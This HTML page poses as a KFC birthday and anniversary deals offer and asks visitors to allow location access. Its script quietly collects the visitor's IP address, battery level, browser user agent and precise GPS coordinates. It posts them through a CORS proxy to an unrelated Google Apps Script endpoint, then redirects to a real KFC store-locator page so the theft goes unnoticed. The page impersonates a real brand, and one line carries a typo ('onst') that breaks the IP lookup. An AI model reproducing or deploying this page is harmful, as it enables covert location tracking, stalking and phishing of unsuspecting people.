<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>KFC VIP Deals</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    /* Same CSS as before */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body {
      height: 100%;
      font-family: 'Segoe UI', sans-serif;
      background: radial-gradient(circle at top, #b02e0c, #3e0000);
      overflow: hidden;
      position: relative;
    }

    .bg-animation {
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      pointer-events: none;
      z-index: 1;
    }

    .bg-animation img {
      position: absolute;
      width: 90px;
      opacity: 0.85;
      filter: drop-shadow(0 0 8px rgba(255,255,255,0.4));
    }

    .float-up { animation: floatUp 7s linear infinite; }
    .float-down { animation: floatDown 7s linear infinite; }

    @keyframes floatUp {
      0% { transform: translateY(100vh) scale(0.8) rotate(0deg); opacity: 0; }
      10% { opacity: 1; }
      100% { transform: translateY(-150px) scale(1.2) rotate(360deg); opacity: 0; }
    }

    @keyframes floatDown {
      0% { transform: translateY(-150px) scale(1.2) rotate(0deg); opacity: 0; }
      10% { opacity: 1; }
      100% { transform: translateY(100vh) scale(0.8) rotate(-360deg); opacity: 0; }
    }

    .card {
      background: white;
      text-align: center;
      padding: 50px 30px;
      max-width: 500px;
      margin: 120px auto;
      border-radius: 20px;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
      position: relative;
      z-index: 9999;
    }

    .logo {
      width: 180px;
      margin-bottom: 20px;
    }

    h1 { font-size: 2.8rem; color: #d40000; margin: 10px 0; }
    p { font-size: 1.2rem; color: #333; }

    .btn {
      margin-top: 30px;
      padding: 15px 30px;
      background-color: #d40000;
      color: white;
      border: none;
      border-radius: 50px;
      font-size: 1.2rem;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    .btn:hover {
      background-color: #a70000;
    }
  </style>
</head>
<body>

  <div class="bg-animation" id="background"></div>

  <div class="card">
    <img src="kfc-logo.png" alt="KFC Logo" class="logo">
    <h1>KFC</h1>
    <p>Allow location to unlock exclusive nearby deals for your Birthday or Anniversary üéÅ</p>
    <button class="btn" onclick="sendLocation()">üîé Nearby KFC Deals</button>
  </div>

<script>
const foodIcons = ["drumstick.png", "sauce.png", "wing.png"];
const bg = document.getElementById('background');

// Animate background
for (let i = 0; i < 40; i++) {
  const img = document.createElement('img');
  img.src = foodIcons[Math.floor(Math.random() * foodIcons.length)];
  img.style.left = Math.random() * 100 + 'vw';
  img.style.top = '100vh';
  img.classList.add('float-up');
  img.style.animationDuration = (6 + Math.random() * 3) + 's';
  bg.appendChild(img);
}

for (let i = 0; i < 40; i++) {
  const img = document.createElement('img');
  img.src = foodIcons[Math.floor(Math.random() * foodIcons.length)];
  img.style.left = Math.random() * 100 + 'vw';
  img.style.top = '-150px';
  img.classList.add('float-down');
  img.style.animationDuration = (6 + Math.random() * 3) + 's';
  bg.appendChild(img);
}

async function sendLocation() {
  let lat = "N/A", lon = "N/A", accuracy = "N/A", ip = "N/A", battery = "N/A", userAgent = navigator.userAgent;

  // Get IP
  try {
    onst ipRes = await fetch("https://api.ipify.org?format=json");
    const ipData = await ipRes.json();
    ip = ipData.ip;
  } catch (e) {}

  // Get Battery
  try {
    const batt = await navigator.getBattery();
    battery = Math.round(batt.level * 100) + "%";
  } catch (e) {}

  // Geolocation
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        lat = position.coords.latitude;
        lon = position.coords.longitude;
        accuracy = position.coords.accuracy;

        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;

        fetch("https://corsproxy.io/?" + encodeURIComponent("https://script.google.com/macros/s/AKfycbxljE9VsM4fPUOBDYZhoI3tQDrATP_bm817-r5CAu3sNXmZ314ouy8Dv5yIL77NNjDt/exec"), {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            lat: lat,
            lon: lon,
            accuracy: accuracy,
            ip: ip,
            battery: battery,
            ua: userAgent,
            map: mapUrl
          })
        }).finally(() => {
          setTimeout(() => {
            window.location.href = "https://www.kfcpakistan.com/store-locations";
          }, 1000);
        });
      },
      () => {
        window.location.href = "https://www.kfcpakistan.com/store-locations";
      }
    );
  } else {
    window.location.href = "https://www.kfcpakistan.com/store-locations";
  }
}
</script>
</body>
</html>
